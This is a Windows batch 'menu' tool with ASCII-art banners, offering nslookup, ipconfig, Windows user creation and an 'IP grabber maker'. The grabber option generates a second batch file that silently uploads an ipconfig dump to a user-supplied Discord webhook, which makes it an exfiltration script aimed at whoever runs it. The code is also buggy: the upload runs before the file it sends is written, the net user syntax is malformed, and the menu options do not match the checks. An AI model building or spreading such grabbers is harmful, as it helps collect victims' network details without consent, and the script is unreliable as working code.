@echo off
title wock menu -by mtyzzy
chcp 65001 >nul


:hi
color b
echo                ██     ██    ████████  
echo                ██     ██       ██  
echo                █████████       ██
echo                ██     ██       ██ 
echo                ██     ██    ████████   
timeout /t 2 >nul
cls
goto user
                                         
             

:user
color c
echo               ██    ██ ███████ ███████ ██████  
echo               ██    ██ ██      ██      ██   ██ 
echo               ██    ██ ███████ █████   ██████  
echo               ██    ██      ██ ██      ██   ██ 
echo                ██████  ███████ ███████ ██   ██ 
timeout /t 2 >nul
cls
goto press


:press
echo           ██████  ██████  ███████ ███████ ███████ 
echo           ██   ██ ██   ██ ██      ██      ██      
echo           ██████  ██████  █████   ███████ ███████ 
echo           ██      ██   ██ ██           ██      ██ 
echo           ██      ██   ██ ███████ ███████ ███████ 
timeout /t 2 >nul
cls
goto enter



:enter
echo          ███████ ███    ██ ████████ ███████ ██████  
echo          ██      ████   ██    ██    ██      ██   ██ 
echo          █████   ██ ██  ██    ██    █████   ██████  
echo          ██      ██  ██ ██    ██    ██      ██   ██ 
echo          ███████ ██   ████    ██    ███████ ██   ██ 
pause >nul
cls
goto menu
                                           
                                           
                                        
                                        

:menu
echo.
echo.
echo ██     ██  ██████   ██████ ██   ██  ╼╾Type
echo ██     ██ ██    ██ ██      ██  ██      └───(wock) to go to menu
echo ██  █  ██ ██    ██ ██      █████   
echo ██ ███ ██ ██    ██ ██      ██  ██  
echo  ███ ███   ██████   ██████ ██   ██ 
echo.
echo ┌───────]-Bat Tool[User=Pc]
set /p input="└─# " 
cls 

if %input% EQU wock ( goto menu2 )

:menu2
color d
echo.
echo.
echo ██     ██  ██████   ██████ ██   ██  ╼╾Type
echo ██     ██ ██    ██ ██      ██  ██      └───(main) to go to main menu
echo ██  █  ██ ██    ██ ██      █████   
echo ██ ███ ██ ██    ██ ██      ██  ██  
echo  ███ ███   ██████   ██████ ██   ██
echo.
echo             ╼╾Type web for website ip
echo             └───   
echo                                     ╼╾Type all for see all ip
echo                                      └───   
echo        websites ip : Enter a website to see its cast and IP
echo         See all ip : See all ur ip info
echo      User creation : Make a new user on windows      ╼╾Type user for this option
echo   Ip grabber maker : Make an IP grabber script    ╼╾Type grabber for ip grabber maker

echo.
echo ┌───────]-Bat Tool[User=Pc]
set /p input="└─# " 
cls

if %input% EQU main ( goto menu )  

if %input% EQU web (


	:getIPAddressFromWebsite
cls
set /p website="Enter a URL: "
echo ╔════════════════════════════════════════╗
echo ║[96m[?]Finding information on %website%    ║
echo ╚════════════════════════════════════════╝
timeout /t 3 >nul
nslookup %website%
pause
cls
goto menu2
)


if %input% EQU ip (
ipconfig
pause
cls
goto menu2
)

if %input% EQU user (


        echo You need adminitstrato do u still want to continue...
    pause
    cls
    goto add



    :add
    echo ----------------------
    echo     user creation
    echo ----------------------
    set /p username="Enter a username: "
    set /p password="Enter a password: "
    net user %username% : %password% /add
    echo loading....
    timeout /t 3 >nul
    echo New user created with batch code
    pause
    cls
goto menu2
)


if %input% EQU grabber (


    :create_ip_grabber_script
cls
echo [37m╔══════════════════════════╗
echo ║ [91mIp Grabber Script        [37m║
echo [37m╚══════════════════════════╝
set /p "webhook=Enter your Discord webhook URL: "

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig ^>ip.txt >> ip_grabber_exec.bat

echo IP grabber script has been created as ip_grabber_exec.bat.
pause
cls
goto menu2
)
                                   